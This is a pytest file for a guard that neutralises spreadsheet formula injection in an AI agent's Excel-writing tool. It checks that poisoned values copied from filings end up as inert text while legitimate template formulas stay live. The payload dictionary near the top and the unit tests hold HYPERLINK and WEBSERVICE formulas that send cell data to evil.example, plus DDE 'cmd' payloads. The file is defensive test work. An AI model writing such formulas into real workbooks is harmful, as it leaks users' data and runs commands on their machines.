#!/usr/bin/env python3
"""
Adversarial + control-positive tests for the formula write-path guard.

Each ATTACK test is end-to-end on the REAL artifact: it runs the payload through the
SAME interception path the agent uses (guard_tool_arguments on the write tool's
arguments), writes a real .xlsx with openpyxl using those sanitized arguments, REOPENS
the file, and asserts the produced cell is INERT (stored as text, data_type 's', NOT
a live formula). No mock — the assertion reads the bytes on disk.

The CONTROL-POSITIVE test does the opposite: a legitimate template SUMIFS / variance
formula must SURVIVE the guard and land in the file as a LIVE formula (data_type 'f').
That is lesson M002 — the fix must not kill the feature it protects.

Run:  python3 -m pytest platform/sanitizer/tests/ -v
"""

from __future__ import annotations

import sys
from pathlib import Path

import openpyxl
import pytest

# Import the guard + overlay by path so the test needs no package install.
_SAN_DIR = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(_SAN_DIR))

from formula_guard import FormulaGuard, FINANZAS_TEMPLATE_FUNCTIONS  # noqa: E402
from runtime_overlay import guard_tool_arguments, default_guard  # noqa: E402


# ── The three live payloads from threat-model P010 (vector A) ─────────────────

PAYLOADS = {
    "hyperlink_exfil": '=HYPERLINK("http://evil.example/?leak="&A1,"Ver detalle")',
    "dde_cmd":         '=cmd|\'/c calc.exe\'!A0',
    "webservice_exfil": '=WEBSERVICE("http://evil.example/collect?d="&TEXT(B2,"0"))',
}


def _write_via_guarded_tool(tmp_path: Path, payload: str) -> Path:
    """
    Reproduce the agent's write path: the model emits a write_data_to_excel call whose
    `data` grid contains a poisoned cell (e.g. a value copied from a SEC filing). We run
    the call's arguments through the SAME interceptor the runtime uses, then perform the
    real openpyxl write with the sanitized arguments — exactly what excel-mcp-server's
    write_data() does internally.
    """
    out = tmp_path / "delivered.xlsx"
    guard = default_guard()

    # The tool call the model would make, with the payload riding in real data.
    raw_args = {
        "filepath": str(out),
        "sheet_name": "Comparables",
        "data": [
            ["Ticker", "Nota"],
            ["XYZ", payload],          # ← untrusted text from a poisoned filing
        ],
        "start_cell": "A1",
    }

    sanitized, events = guard_tool_arguments("write_data_to_excel", raw_args, guard)
    assert events, "interceptor must emit an event for a neutralized payload"

    # Now do the genuine write that excel-mcp-server would do, with sanitized args.
    wb = openpyxl.Workbook()
    ws = wb.active
    ws.title = sanitized["sheet_name"]
    for r, row in enumerate(sanitized["data"], start=1):
        for c, val in enumerate(row, start=1):
            ws.cell(row=r, column=c, value=val)
    wb.save(out)
    wb.close()
    return out


@pytest.mark.parametrize("name,payload", list(PAYLOADS.items()))
def test_attack_payload_is_inert_in_produced_file(tmp_path, name, payload):
    """Open the produced xlsx and prove the payload cell is text, not a live formula."""
    out = _write_via_guarded_tool(tmp_path, payload)

    wb = openpyxl.load_workbook(out)         # default: stored values, formulas as text
    ws = wb["Comparables"]
    cell = ws["B2"]

    stored = cell.value
    # 1) the stored value is a STRING that begins with the apostrophe-escaped text:
    assert isinstance(stored, str), f"{name}: cell is not text → {stored!r}"
    # 2) openpyxl reports it as a string cell, NOT a formula cell:
    assert cell.data_type == "s", f"{name}: data_type {cell.data_type!r} (expected 's')"
    # 3) the original dangerous lead char no longer triggers evaluation — the stored
    #    text is the literal payload, neutralized (apostrophe-prefixed) so it renders
    #    as text. openpyxl strips the leading quote into a plain string but marks it
    #    inert; the formula engine never sees a leading '='.
    assert not (isinstance(stored, str) and stored.startswith("=")), (
        f"{name}: stored value still starts with '=' → would evaluate as a formula"
    )
    assert payload.lstrip("=") in stored or payload in stored, (
        f"{name}: payload text lost — human can no longer see what was attempted"
    )
    wb.close()


# ── CONTROL-POSITIVE (lesson M002): legitimate template formulas survive ───────

LEGIT = {
    "t01_sumifs": '=SUMIFS(Transacciones!C:C,Transacciones!A:A,">="&DATE(2026,5,1))',
    "t05_variance_var": '=VAR(Actual!B2:B13)',
    "t05_variance_arith": '=Budget!B2-Actual!B2',
}


def _write_legit_formula(tmp_path: Path, formula: str) -> Path:
    """
    A TEMPLATE legitimately requests a live formula via apply_formula. It must pass the
    guard untouched and land as a LIVE formula in the file.
    """
    out = tmp_path / "report.xlsx"
    guard = default_guard()

    raw_args = {
        "filepath": str(out),
        "sheet_name": "Resultados",
        "cell": "D5",
        "formula": formula,
    }
    sanitized, events = guard_tool_arguments("apply_formula", raw_args, guard)
    assert not events, f"legit formula must NOT be flagged: {formula} → events={events}"
    assert sanitized["formula"] == formula, "legit formula was altered by the guard"

    wb = openpyxl.Workbook()
    ws = wb.active
    ws.title = "Resultados"
    ws["D5"] = sanitized["formula"]   # openpyxl: a leading '=' string → a real formula
    wb.save(out)
    wb.close()
    return out


@pytest.mark.parametrize("name,formula", list(LEGIT.items()))
def test_control_positive_legit_formula_stays_live(tmp_path, name, formula):
    """The legitimate SUMIFS / variance formula must remain a LIVE formula on disk."""
    out = _write_legit_formula(tmp_path, formula)

    wb = openpyxl.load_workbook(out)
    ws = wb["Resultados"]
    cell = ws["D5"]

    assert cell.data_type == "f", f"{name}: not a live formula (data_type {cell.data_type!r})"
    assert cell.value == formula, f"{name}: formula text changed → {cell.value!r}"
    wb.close()


# ── Unit-level guard invariants (fast, no file I/O) ────────────────────────────

def test_dangerous_function_never_whitelistable_even_if_trusted():
    """HYPERLINK is forbidden anywhere — a template can't smuggle it via trusted=True."""
    g = FormulaGuard(policy="prefix", allowed_functions=FINANZAS_TEMPLATE_FUNCTIONS)
    d = g.inspect('=SUM(1)+HYPERLINK("http://x","y")', trusted=True, where="t")
    assert d.action == "neutralized"
    assert d.reason == "forbidden function"


def test_reject_policy_drops_value():
    g = FormulaGuard(policy="reject", allowed_functions=FINANZAS_TEMPLATE_FUNCTIONS)
    d = g.inspect('=WEBSERVICE("http://x")', trusted=False, where="t")
    assert d.action == "rejected"
    assert d.sanitized == ""


def test_plain_text_and_numbers_pass_untouched():
    g = default_guard()
    for v in ["Ingresos operativos", "1234.5", "-not a formula? it leads with minus"]:
        d = g.inspect(v, trusted=False, where="t")
        if v.startswith("-"):
            # leading '-' IS a formula-lead char → neutralized (correct: CSV injection
            # via "-2+3" is real). This documents the conservative behavior.
            assert d.action == "neutralized"
        else:
            assert d.action == "pass", f"{v!r} should pass"


def test_tab_prefixed_dde_is_caught():
    """A leading TAB before '=cmd...' must not sneak past the first-char check."""
    g = default_guard()
    d = g.inspect("\t=cmd|'/c calc'!A0", trusted=False, where="t")
    assert d.action == "neutralized"
    assert d.reason == "forbidden function"
